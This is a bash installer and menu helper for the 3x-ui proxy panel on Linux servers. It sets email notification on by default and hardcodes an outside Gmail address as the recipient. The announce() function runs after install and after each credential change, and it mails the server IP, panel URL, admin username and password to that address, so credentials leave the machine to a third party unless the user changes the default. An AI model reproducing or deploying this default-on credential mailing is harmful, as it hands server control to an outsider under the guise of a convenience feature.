#!/bin/bash
# x-ui helper v2 (Interactive OK + ENV override + Menu + Email notify)
# Usage:
#   ./xui-helper.sh              -> Menu
#   ./xui-helper.sh install      -> Install/Update + set creds (ENV overrides)
#   ./xui-helper.sh set-cred     -> Change user/pass/port (no reset)
#   ./xui-helper.sh ch-pass      -> Change password only
#   ./xui-helper.sh email-test   -> Test email

set -euo pipefail

# -------- Colors / UI --------
plain='\033[0m'; red='\033[0;31m'; yellow='\033[0;33m'
tri1='\033[38;5;39m'; tri2='\033[38;5;226m'; tri3='\033[38;5;201m'
supports_256(){ [[ "${TERM-}" =~ 256color ]]||[[ "${COLORTERM-}" =~ truecolor|24bit ]]; }
tri(){ local m="$*"; if supports_256; then local l=${#m}; local a=$((l/3)); local b=$((2*l/3)); echo -e "${tri1}${m:0:$a}${tri2}${m:$a:$((b-a))}${tri3}${m:$b}${plain}"; else echo -e "$m"; fi; }
banner(){ tri "┌───────────────────────────────────────────────────────────┐"; tri "│  $*"; tri "└───────────────────────────────────────────────────────────┘"; }

# -------- Config (persist) --------
CONF="/etc/xui-helper.conf"
EMAIL_ENABLED="${EMAIL_ENABLED-true}"
EMAIL_TO="${EMAIL_TO-juevpn@gmail.com}"
IP_OVERRIDE="${IP_OVERRIDE-}"
[[ -f "$CONF" ]] && source "$CONF"
save_conf(){ cat >"$CONF"<<EOF
EMAIL_ENABLED="$EMAIL_ENABLED"
EMAIL_TO="$EMAIL_TO"
IP_OVERRIDE="$IP_OVERRIDE"
EOF
chmod 600 "$CONF" || true; }

# -------- Root check --------
[[ $EUID -ne 0 ]] && echo -e "${red}Please run as root.${plain}" && exit 1

# -------- OS / Arch --------
detect_os(){ . /etc/os-release 2>/dev/null || . /usr/lib/os-release; echo "$ID"; }
arch(){ case "$(uname -m)" in x86_64|amd64)echo amd64;; i*86|x86)echo 386;; aarch64|arm64)echo arm64;; armv7*)echo armv7;; armv6*)echo armv6;; armv5*)echo armv5;; s390x)echo s390x;; *) echo "unknown"; exit 1;; esac; }

install_base(){
  local id; id=$(detect_os)
  case "$id" in
    ubuntu|debian|armbian) apt-get update && apt-get install -y wget curl tar tzdata ca-certificates mailutils msmtp-mta || true ;;
    centos|rhel|almalinux|rocky|ol) yum -y update && yum install -y wget curl tar tzdata ca-certificates mailx msmtp || true ;;
    fedora|amzn|virtuozzo) dnf -y update && dnf install -y wget curl tar tzdata ca-certificates mailx msmtp || true ;;
    arch|manjaro|parch)    pacman -Syu --noconfirm && pacman -S --noconfirm wget curl tar tzdata ca-certificates msmtp-mta mailutils || true ;;
    opensuse-*)            zypper refresh && zypper -q install -y wget curl tar timezone ca-certificates msmtp mailx || true ;;
    alpine)                apk add --no-cache wget curl tar tzdata ca-certificates msmtp mailx || true ;;
    *)                     apt-get update && apt-get install -y wget curl tar tzdata ca-certificates mailutils msmtp-mta || true ;;
  esac
}

# -------- Helpers --------
XUI="/usr/local/x-ui/x-ui"
cmd_ok(){ command -v "$1" >/dev/null 2>&1; }
get_ip(){
  [[ -n "$IP_OVERRIDE" ]] && { echo "$IP_OVERRIDE"; return; }
  for u in https://api4.ipify.org https://ipv4.icanhazip.com https://v4.api.ipinfo.io/ip https://ipv4.myexternalip.com/raw https://4.ident.me; do
    ip=$(curl -fsS --max-time 3 "$u" | tr -d '[:space:]') || true
    [[ -n "${ip-}" ]] && { echo "$ip"; return; }
  done; echo SERVER_IP;
}
announce(){
  local u="$1" p="$2" port="$3" ip url
  ip=$(get_ip); url="http://${ip}:${port}/"
  banner "x-ui Access"
  tri "URL:      $url"
  tri "Username: $u"
  tri "Password: $p"
  tri "Port:     $port"
  [[ "$EMAIL_ENABLED" == "true" && -n "$EMAIL_TO" ]] && {
    local body="Access URL: ${url}
Username: ${u}
Password: ${p}
Port:     ${port}
Timestamp: $(date -u +"%Y-%m-%d %H:%M:%S UTC")"
    if cmd_ok mail; then echo -e "$body" | mail -s "[x-ui] ${ip}" "$EMAIL_TO" || true
    elif cmd_ok sendmail; then { echo "Subject: [x-ui] ${ip}"; echo "To: $EMAIL_TO"; echo; echo -e "$body"; } | sendmail -t || true
    elif cmd_ok msmtp; then { echo "Subject: [x-ui] ${ip}"; echo "To: $EMAIL_TO"; echo; echo -e "$body"; } | msmtp "$EMAIL_TO" || true
    else echo -e "${yellow}(Mailer not configured; email skipped)${plain}"; fi
  }
}

# Read with ENV override + interactive fallback
ask_creds(){
  # ENV first
  U="${XUI_USER-}"; P="${XUI_PASS-}"; PORT="${XUI_PORT-}"
  if [[ -z "${U}" ]]; then read -e -p "Username: " U; fi
  if [[ -z "${P}" ]]; then read -e -p "Password (visible): " P; fi
  if [[ -z "${PORT}" ]]; then read -e -p "Panel port [Enter=random]: " PORT || true; fi
  [[ -z "${PORT}" ]] && PORT=$(shuf -i 1024-62000 -n 1)
}

show_settings(){ [[ -x "$XUI" ]] && "$XUI" setting -show true || echo -e "${yellow}x-ui not installed.${plain}"; }

set_cred(){
  [[ ! -x "$XUI" ]] && { echo -e "${red}x-ui not installed.${plain}"; return 1; }
  echo
  banner "Set Username / Password / Port (NO reset)"
  ask_creds
  "$XUI" setting -username "$U" -password "$P" -port "$PORT" -webBasePath ""
  if cmd_ok systemctl; then systemctl restart x-ui || true; else rc-service x-ui restart || true; fi
  announce "$U" "$P" "$PORT"
}

ch_pass(){
  [[ ! -x "$XUI" ]] && { echo -e "${red}x-ui not installed.${plain}"; return 1; }
  local cur_user cur_port
  cur_user=$("$XUI" setting -show true | awk -F': ' '/username:/ {print $2}')
  cur_port=$("$XUI" setting -show true | awk -F': ' '/port:/ {print $2}')
  banner "Change Password (user: ${cur_user})"
  if [[ -n "${XUI_PASS-}" ]]; then P="$XUI_PASS"; else read -e -p "New password (visible): " P; fi
  "$XUI" setting -password "$P" -webBasePath ""
  if cmd_ok systemctl; then systemctl restart x-ui || true; else rc-service x-ui restart || true; fi
  announce "$cur_user" "$P" "$cur_port"
}

install_xui(){
  local tag
  tag=$(curl -fsSL "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep -oP '"tag_name":\s*"\K[^"]+') || \
  tag=$(curl -4fsSL "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep -oP '"tag_name":\s*"\K[^"]+')
  [[ -z "${tag-}" ]] && { echo -e "${red}Cannot fetch latest release tag.${plain}"; exit 1; }

  banner "Installing 3x-ui ${tag}"
  cd /usr/local/
  wget --inet4-only -qO x-ui-linux-$(arch).tar.gz "https://github.com/MHSanaei/3x-ui/releases/download/${tag}/x-ui-linux-$(arch).tar.gz"
  wget --inet4-only -qO /usr/bin/x-ui-temp https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh
  [[ -e /usr/local/x-ui/ ]] && { cmd_ok systemctl && systemctl stop x-ui || rc-service x-ui stop || true; rm -rf /usr/local/x-ui/; }
  tar zxf x-ui-linux-$(arch).tar.gz && rm -f x-ui-linux-$(arch).tar.gz
  cd x-ui
  chmod +x x-ui x-ui.sh
  if [[ $(arch) == armv5 || $(arch) == armv6 || $(arch) == armv7 ]]; then mv bin/xray-linux-$(arch) bin/xray-linux-arm; chmod +x bin/xray-linux-arm; fi
  chmod +x x-ui bin/xray-linux-$(arch)
  mv -f /usr/bin/x-ui-temp /usr/bin/x-ui && chmod +x /usr/bin/x-ui
  if [[ "$(detect_os)" == "alpine" ]]; then
    wget --inet4-only -qO /etc/init.d/x-ui https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.rc
    chmod +x /etc/init.d/x-ui; rc-update add x-ui || true
  else
    cp -f x-ui.service /etc/systemd/system/; systemctl daemon-reload; systemctl enable x-ui
  fi

  # initial manual creds
  "$XUI" setting -webBasePath "" >/dev/null 2>&1 || true
  banner "Initial credentials (manual / or via ENV)"
  ask_creds
  "$XUI" setting -username "$U" -password "$P" -port "$PORT" -webBasePath ""
  "$XUI" migrate || true
  if cmd_ok systemctl; then systemctl restart x-ui || true; else rc-service x-ui restart || true; fi
  announce "$U" "$P" "$PORT"
}

config_notify(){
  banner "Notifications"
  echo -e "Email enabled: ${yellow}${EMAIL_ENABLED}${plain}"
  echo -e "Recipient     : ${yellow}${EMAIL_TO}${plain}"
  read -e -p "Enable email? [Y/n]: " yn || true
  [[ -z "${yn-}" || "$yn" =~ ^[Yy]$ ]] && EMAIL_ENABLED=true || EMAIL_ENABLED=false
  read -e -p "Recipient email (Enter=keep): " em || true; [[ -n "${em-}" ]] && EMAIL_TO="$em"
  read -e -p "Override IP/Host for URL (Enter=auto): " ov || true; [[ -n "${ov-}" ]] && IP_OVERRIDE="$ov"
  save_conf; tri "Saved."
}

smtp_tips(){
cat <<'TIP'
Gmail with msmtp (quick):
  apt install -y msmtp-mta mailutils
  nano /etc/msmtprc
    defaults
    auth on
    tls on
    tls_trust_file /etc/ssl/certs/ca-certificates.crt
    account gmail
    host smtp.gmail.com
    port 587
    from YOUR_EMAIL@gmail.com
    user YOUR_EMAIL@gmail.com
    passwordeval "cat /root/.gmail_app_password"
    account default : gmail
  echo "APP_PASSWORD_16CHARS" > /root/.gmail_app_password && chmod 600 /root/.gmail_app_password
  echo OK | msmtp you@example.com
TIP
}

menu(){
  clear; banner "x-ui Helper Menu"
  echo " 1) Install / Update x-ui"
  echo " 2) Change username/password/port (NO reset)"
  echo " 3) Change password only"
  echo " 4) Show current settings"
  echo " 5) Configure notifications / override IP"
  echo " 6) Email test"
  echo " 7) SMTP setup tips"
  echo " 0) Exit"
  read -e -p "Select: " s
  case "${s-}" in
    1) install_base; install_xui ;;
    2) set_cred ;;
    3) ch_pass ;;
    4) show_settings; read -e -p "Enter..." _ ;;
    5) config_notify ;;
    6) announce "test-user" "test-pass" "0000" ;;  # just to trigger email path
    7) clear; smtp_tips; read -e -p "Enter..." _ ;;
    0) exit 0 ;;
    *) echo "Invalid"; sleep 1 ;;
  esac
  menu
}

# -------- Entrypoint --------
case "${1-}" in
  install)    install_base; install_xui ;;
  set-cred)   set_cred ;;
  ch-pass)    ch_pass ;;
  email-test) announce "test-user" "test-pass" "0000" ;;
  ""|menu)    menu ;;
  *) echo "Unknown cmd: $1" && exit 1 ;;
esac